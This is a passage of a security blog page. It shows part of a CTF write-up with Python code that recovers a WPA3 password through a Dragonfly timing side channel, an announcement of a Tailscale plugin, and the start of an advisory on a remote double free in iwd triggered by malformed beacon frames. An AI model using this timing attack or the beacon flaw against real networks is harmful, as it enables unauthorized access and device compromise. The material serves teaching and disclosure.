</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> counter2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>The provided challenge also had a terrible way to convert a binary number which really slowed things down,
and also had an off by one error probably.</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Convert returned_bits to the non-negative integer c (see Appendix C.2.1).</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">C </span><span class="token operator">=</span><span class="token plain"> </span><span class="token number">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">for</span><span class="token plain"> i </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">range</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">n</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">int</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">binary_repr</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">i</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">==</span><span class="token plain"> </span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        C </span><span class="token operator">+=</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">pow</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token number">2</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> n</span><span class="token operator">-</span><span class="token plain">i</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>versus</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">X </span><span class="token operator">=</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">int</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">binary_repr</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">2</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token operator">&lt;&lt;</span><span class="token number">1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>My solution normalized the remote timings to compare them with the offline compute.</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">normalize_array</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">arr</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:rgb(255, 121, 198)">&quot;&quot;&quot;Normalize an array to be between 0 and 1.&quot;&quot;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">arr </span><span class="token operator">-</span><span class="token plain"> arr</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token builtin" style="color:rgb(189, 147, 249)">min</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">/</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">arr</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token builtin" style="color:rgb(189, 147, 249)">max</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">-</span><span class="token plain"> arr</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token builtin" style="color:rgb(189, 147, 249)">min</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">calc_mse</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">psk</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> timings</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> guess_timings</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    y_actual </span><span class="token operator">=</span><span class="token plain"> normalize_array</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">np</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">array</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">timings</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    y_predicted </span><span class="token operator">=</span><span class="token plain"> normalize_array</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">np</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">array</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">guess_timings</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    mse </span><span class="token operator">=</span><span class="token plain"> np</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">mean</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">y_actual </span><span class="token operator">-</span><span class="token plain"> y_predicted</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">**</span><span class="token plain"> </span><span class="token number">2</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> mse</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">solve_psk_fast</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">ap_mac</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> my_macs</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> timings</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    computed </span><span class="token operator">=</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">open</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;compute.txt&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;rb&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">readlines</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    psk </span><span class="token operator">=</span><span class="token plain"> </span><span class="token boolean">None</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    best_mse </span><span class="token operator">=</span><span class="token plain"> </span><span class="token number">100</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">for</span><span class="token plain"> line </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token plain"> computed</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        p</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> tmp </span><span class="token operator">=</span><span class="token plain"> line</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">split</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">b&quot;|&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        p </span><span class="token operator">=</span><span class="token plain"> p</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">strip</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">decode</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        guess_timings </span><span class="token operator">=</span><span class="token plain"> json</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">loads</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">tmp</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">strip</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        mse </span><span class="token operator">=</span><span class="token plain"> calc_mse</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">p</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> timings</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> guess_timings</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> mse </span><span class="token operator">&lt;</span><span class="token plain"> best_mse</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;new best&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain">mse</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain">p</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            best_mse </span><span class="token operator">=</span><span class="token plain"> mse</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            psk </span><span class="token operator">=</span><span class="token plain"> p</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">psk</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> psk</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>During the CTF the services were overwhelmed by naive solutions, so we ended up scaling it up,
but it was a little bit frustrating for some teams at times.  In the future we&#x27;ll have to put remote timing attempts behind a queue and/or proof of work.</p>
<p>To make the challenge harder, teams were also given a second variant with a larger keyspace. Instead of 60k wordlist, they were asked to attack a random 36-alphabet 5 character password. 7 teams solved it. Hats off to the great work, since you understood something Dan Harkins pretended not to when it was explained to him by so many cryptographers.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="links">Links<a href="#links" class="hash-link" aria-label="Direct link to Links" title="Direct link to Links">​</a></h2>
<p>If you&#x27;d like to learn more about these attacks, the <a href="https://papers.mathyvanhoef.com/dragonblood.pdf" target="_blank" rel="noopener noreferrer">Dragonblood</a> paper is the one you&#x27;ll want.</p>
<p>The up to date constant time implementation of the password element deriviation in hostapd is located here: <a href="https://w1.fi/cgit/hostap/tree/src/common/sae.c#n283" target="_blank" rel="noopener noreferrer">https://w1.fi/cgit/hostap/tree/src/common/sae.c#n283</a>.</p></div><footer class="row docusaurus-mt-lg"><div class="col"><b>Tags:</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/pages/blog/tags/dragonfly">dragonfly</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/pages/blog/tags/sae">sae</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/pages/blog/tags/cryptography">cryptography</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/pages/blog/tags/ctf">ctf</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/pages/blog/tags/wifi">wifi</a></li></ul></div></footer></article><article class="margin-bottom--xl" itemprop="blogPost" itemscope="" itemtype="https://schema.org/BlogPosting"><meta itemprop="description" content="Introducing SPR-TailScale"><header><h2 class="title_f1Hy" itemprop="headline"><a itemprop="url" href="/pages/blog/spr-tailscale-integration">SPR Tailscale</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2024-03-26T00:00:00.000Z" itemprop="datePublished">March 26, 2024</time> · <!-- -->2 min read</div><div class="margin-top--md margin-bottom--sm row"><div class="col col--6 authorCol_Hf19"><div class="avatar margin-bottom--sm"><div class="avatar__intro" itemprop="author" itemscope="" itemtype="https://schema.org/Person"><div class="avatar__name"><a href="https://twitter.com/defendtheworld" target="_blank" rel="noopener noreferrer" itemprop="url"><span itemprop="name">Alex Radocea</span></a></div></div></div></div></div></header><div class="markdown" itemprop="articleBody"><h2 class="anchor anchorWithStickyNavbar_LWe7" id="introducing-spr-tailscale">Introducing SPR-TailScale<a href="#introducing-spr-tailscale" class="hash-link" aria-label="Direct link to Introducing SPR-TailScale" title="Direct link to Introducing SPR-TailScale">​</a></h2>
<p>We&#x27;ve released a new iteration of the <a href="https://github.com/spr-networks/spr-tailscale" target="_blank" rel="noopener noreferrer">TailScale integration for SPR</a>!
This plugin was put together with <a href="https://twitter.com/willy_wong" target="_blank" rel="noopener noreferrer">@willy_wong</a>.</p>
<p><img loading="lazy" alt="spr-tailscale" src="/pages/assets/images/combo-6570affc7ea16f7b29e7fafdfb216593.png" width="2210" height="1218" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="under-the-hood">Under The Hood<a href="#under-the-hood" class="hash-link" aria-label="Direct link to Under The Hood" title="Direct link to Under The Hood">​</a></h2>
<p>Getting this plugin to work in the first place required some thinking.
The first was addressing a key missing feature for SPR: interface-based firewall rules and routing.</p>
<p><img loading="lazy" alt="firewall-custom-interface-rule-add" src="/pages/assets/images/firewall-custom-interface-rule-add-6c2885f7af0f5fd0911a4fde33cb4c27.png" width="1280" height="599" class="img_ev3q"></p>
<p>This capability lets SPR perform container microsegmentation.  Any interface can be treated this way actually.
It allows for connecting interfaces with policies and groups that SPR has not been explicitly programmed for, as well as providing them API access.</p>
<p>The TailScale plugin sets up its own policy based routing and firewall rules, so being able to run it inside of its own network namespace is ideal.
SPR then uses the custom interface rule to route to the container&#x27;s network and let it do the forwarding on its own.</p>
<p>Next, setting it up was awkward, painful. To fix this the SPR team added UX for plugins, and the ability to install a plugin via a URL with an OTP code verification. And today we&#x27;ve released this capability for <code>spr-tailscale</code>!  It&#x27;s supported from SPR version 0.3.7</p>
<p><img loading="lazy" alt="spr-tailscale" src="/pages/assets/images/tailscale-ui-29391be90e22dc10a329d1a499d63c55.png" width="2384" height="1158" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="what-can-it-do-">What can it do ?<a href="#what-can-it-do-" class="hash-link" aria-label="Direct link to What can it do ?" title="Direct link to What can it do ?">​</a></h2>
<p>This integration lets SPR devices selectively access TailScale peers. And similarly, TailScale peers can be joined to SPR groups to give them access to SPR devices.</p>
<p>The Plugin presents a React Based UI and simplifies the install. After the install, a user needs to present their Auth Key and they&#x27;re good to go.</p>
<p>The container can run as an exit node as well.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="links">Links<a href="#links" class="hash-link" aria-label="Direct link to Links" title="Direct link to Links">​</a></h2>
<p>You can check out the <a href="https://github.com/spr-networks/spr-tailscale" target="_blank" rel="noopener noreferrer">spr-tailscale</a> integration here!</p></div><footer class="row docusaurus-mt-lg"><div class="col"><b>Tags:</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/pages/blog/tags/tailscale">tailscale</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/pages/blog/tags/wireguard">wireguard</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/pages/blog/tags/microsegmentation">microsegmentation</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/pages/blog/tags/vpn">vpn</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/pages/blog/tags/plugins">plugins</a></li></ul></div></footer></article><article class="margin-bottom--xl" itemprop="blogPost" itemscope="" itemtype="https://schema.org/BlogPosting"><meta itemprop="description" content="CVE-2024-28084 Patched in Inet Wireless Daemon 2.16"><header><h2 class="title_f1Hy" itemprop="headline"><a itemprop="url" href="/pages/blog/beacon-double-free-inet-wireless-daemon-CVE-2024-28084">Beacon Double Free in IWD</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2024-03-11T00:00:00.000Z" itemprop="datePublished">March 11, 2024</time> · <!-- -->3 min read</div><div class="margin-top--md margin-bottom--sm row"><div class="col col--6 authorCol_Hf19"><div class="avatar margin-bottom--sm"><div class="avatar__intro" itemprop="author" itemscope="" itemtype="https://schema.org/Person"><div class="avatar__name"><a href="https://twitter.com/defendtheworld" target="_blank" rel="noopener noreferrer" itemprop="url"><span itemprop="name">Alex Radocea</span></a></div></div></div></div></div></header><div class="markdown" itemprop="articleBody"><h2 class="anchor anchorWithStickyNavbar_LWe7" id="cve-2024-28084-patched-in-inet-wireless-daemon-216">CVE-2024-28084 Patched in Inet Wireless Daemon 2.16<a href="#cve-2024-28084-patched-in-inet-wireless-daemon-216" class="hash-link" aria-label="Direct link to CVE-2024-28084 Patched in Inet Wireless Daemon 2.16" title="Direct link to CVE-2024-28084 Patched in Inet Wireless Daemon 2.16">​</a></h2>
<p>While preparing some wifi security training, we found a double free vulnerability affecting
APs and Stations running <a href="https://iwd.wiki.kernel.org/" target="_blank" rel="noopener noreferrer"><code>iwd</code></a>. This issue was reported and <a href="https://git.kernel.org/pub/scm/network/wireless/iwd.git/commit/?id=52a47c9fd428904de611a90cbf8b223af879684d" target="_blank" rel="noopener noreferrer">patched</a> with fixes available starting in version 2.16.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="supernetworks--memory-safety">Supernetworks &amp; Memory Safety<a href="#supernetworks--memory-safety" class="hash-link" aria-label="Direct link to Supernetworks &amp; Memory Safety" title="Direct link to Supernetworks &amp; Memory Safety">​</a></h2>
<p>Writing secure native code is not simple nor easy. With SPR we&#x27;re striving to build a project that&#x27;s secure by default with memory safety throughout the stack. We&#x27;re continuing to develop a softmac-based solution to eliminate protocol parsing using native code in firmware, drivers and userland. If you&#x27;re interested in joining this effort <a href="mailto:outreach@supernetworks.org" target="_blank" rel="noopener noreferrer">let us know</a>.</p>
<p>We also offer WiFi &amp; Network Security training spanning from Digital Signals Processing to Cryptography to Protocol and Coding safety covering enterprise wifi and WPA2/3. If you&#x27;re interested get in touch at <a href="mailto:trainings@supernetworks.org" target="_blank" rel="noopener noreferrer"><code>training@supernetworks.org</code></a></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="a-double-free-with-less-than-30-bytes">A Double Free With Less Than 30 Bytes<a href="#a-double-free-with-less-than-30-bytes" class="hash-link" aria-label="Direct link to A Double Free With Less Than 30 Bytes" title="Direct link to A Double Free With Less Than 30 Bytes">​</a></h2>
<p>The issue can be triggered remotely by sending a malformed Information Element inside of a beacon, a probe request, or a probe response. These are unauthenticated frames that a malicious attacker with physical proximity can send remotely.</p>
<p>The double free happens while parsing a P2P Information Elements (IEs) with a malformed ADVERTISED_SVC_INFO attribute.
In the context of the flaw, remote double frees are especially powerful as they can lead to information leaks to help bypass ASLR and other hardening measures.</p>
<p><img loading="lazy" src="/pages/assets/images/cve-2024-28084-12dc774a5319ea885facf57a8eb0a08a.png" width="2928" height="992" class="img_ev3q"></p>
<p>Technical details are below.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="code-overview">Code Overview<a href="#code-overview" class="hash-link" aria-label="Direct link to Code Overview" title="Direct link to Code Overview">​</a></h3>
<p>Under <code>p2p_parse_probe_resp()</code>, the ADVERTISED_SVC_INFO attribute is captured.</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">	r </span><span class="token operator">=</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">p2p_parse_attrs</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">pdu</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> len</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">			</span><span class="token function" style="color:rgb(80, 250, 123)">REQUIRED</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">P2P_CAPABILITY</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token operator">&amp;</span><span class="token plain">d</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">capability</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">			</span><span class="token function" style="color:rgb(80, 250, 123)">OPTIONAL</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">EXTENDED_LISTEN_TIMING</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">					</span><span class="token operator">&amp;</span><span class="token plain">d</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">listen_availability</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">			</span><span class="token function" style="color:rgb(80, 250, 123)">OPTIONAL</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">NOTICE_OF_ABSENCE</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token operator">&amp;</span><span class="token plain">d</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">notice_of_absence</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">			</span><span class="token function" style="color:rgb(80, 250, 123)">REQUIRED</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">P2P_DEVICE_INFO</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token operator">&amp;</span><span class="token plain">d</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">device_info</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">			</span><span class="token function" style="color:rgb(80, 250, 123)">OPTIONAL</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">P2P_GROUP_INFO</span><span class="token 